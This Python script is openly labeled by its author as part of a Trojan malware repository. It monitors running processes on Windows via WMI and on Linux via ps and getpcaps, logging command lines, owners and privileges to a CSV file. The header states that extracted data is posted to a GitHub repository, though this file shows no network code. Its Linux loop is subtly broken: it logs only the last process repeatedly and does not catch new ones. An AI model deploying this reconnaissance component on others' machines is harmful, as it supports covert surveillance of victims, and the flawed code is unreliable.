#! /usr/bin/python
#################################################################################################
# Author: Nicholas Fisher
# Date: March 6th 2024
# Important Note:
#  I, Nicholas Fisher, the creator of this Trojan malware, am not responsible for the misuse of 
# these scripts. They are malicious and should only be used in professionally approved White Hat 
# scenarios. You are responsible for any consequences resulting from the misuse of this malware,
# including all fines, fees, and repercussions. Please read this statement carefully: by downloading 
# any of the scripts in this repository, you, as the user, take full responsibility for storing, using,
# and testing these malicious scripts and guidelines. You also take full responsibility for any misuse 
# of this malware. Please note that any data the Trojan extracts will be posted to a GitHub repository, 
# and if that repository is public, all the extracted data will be available for the whole world to see.
# Description of Script
# This script is a process monitor designed to capture information about running processes on both 
# Windows and Linux operating systems. It utilizes platform-specific methods to gather process details
# such as command line arguments, creation time, executable path, parent process ID, user, and privileges.
# The script continuously monitors for new process creations and logs relevant information to a CSV file.
# It distinguishes between Windows and Linux systems, employing WMI for Windows and the ps command for Linux. 
# Example output:
# CommandLine, Create Time, Executable, Parent PID, PID, User, Privileges
# /usr/bin/python3 /path/to/script.py, 00:10, script.py, 1234, 5678, user1, cap_chown,cap_dac_override|
# /bin/bash /path/to/terminal.sh, 01:05, terminal.sh, 5678, 9012, user2, N/A
# /usr/sbin/apache2 -k start, 03:20, apache2, 5678, 3456, root, cap_net_bind_service,cap_net_admin|

#################################################################################################
import os
import sys
import subprocess
import platform

def get_process_privileges(pid):
    # Function to retrieve process privileges
    if platform.system() == 'Windows':
        try:
            # Import necessary modules for Windows privilege retrieval
            import win32api
            import win32con
            import win32security

            # Open the process and its token to retrieve privileges
            hproc = win32api.OpenProcess(
                win32con.PROCESS_QUERY_INFORMATION, False, pid
            )
            htok = win32security.OpenProcessToken(hproc, win32con.TOKEN_QUERY)
            privs = win32security.GetTokenInformation(
                htok, win32security.TokenPrivileges
            )
            # Retrieve and format the privileges
            privileges = ''
            for priv_id, flags in privs:
                if flags == (win32security.SE_PRIVILEGE_ENABLED | win32security.SE_PRIVILEGE_ENABLED_BY_DEFAULT):
                    privileges += f'{win32security.LookupPrivilegeName(None, priv_id)}|'
        except Exception:
            # In case of any error, set privileges to 'N/A'
            privileges = 'N/A'
    elif platform.system() == 'Linux':
        try:
            # Execute getpcaps command to retrieve process capabilities on Linux
            privileges = subprocess.check_output(['getpcaps', str(pid)]).decode().strip()
        except Exception:
            # In case of any error, set privileges to 'N/A'
            privileges = 'N/A'
    else:
        # If the platform is not recognized, set privileges to 'N/A'
        privileges = 'N/A'

    return privileges

def log_to_file(message):
    # Function to log messages to a file
    with open('process_monitor_log.csv', 'a') as fd:
        fd.write(f'{message}\r\n')

def monitor():
    # Main monitoring function
    # Define the header for the log file
    head = 'CommandLine, Create Time, Executable, Parent PID, PID, User, Privileges'
    log_to_file(head)
    # Continuous loop for monitoring
    while True:
        try:
            if platform.system() == 'Windows':
                # If the platform is Windows, use WMI to monitor process creation
                import wmi
                c = wmi.WMI()
                process_watcher = c.Win32_Process.watch_for('creation')
                new_process = process_watcher()
                cmdline = new_process.CommandLine
                create_date = new_process.CreationDate
                executable = new_process.ExecutablePath
                parent_pid = new_process.ParentProcessId
                pid = new_process.ProcessId
                proc_owner = new_process.GetOwner()
            elif platform.system() == 'Linux':
                # If the platform is Linux, use ps command to retrieve process information
                output = subprocess.check_output(['ps', '-o', 'command,etime,pid,ppid,user', '--no-headers']).decode()
                processes = output.strip().split('\n')
                for proc in processes:
                    proc_info = proc.split()
                    cmdline = ' '.join(proc_info[:-4])
                    create_date = proc_info[-4]
                    pid = proc_info[-3]
                    parent_pid = proc_info[-2]
                    proc_owner = proc_info[-1]
                    executable = os.path.basename(cmdline.split()[0])

            # Get privileges for the process
            privileges = get_process_privileges(pid)
            # Create log message
            process_log_message = (
                f'{cmdline}, {create_date}, {executable}, {parent_pid}, {pid}, {proc_owner}, {privileges}'
            )
            # Print and log the message
            print(process_log_message)
            log_to_file(process_log_message)
        except Exception as e:
            # Print any errors encountered during the process monitoring
            print(e)

if __name__ == '__main__':
    # Execute the monitoring function
    monitor()
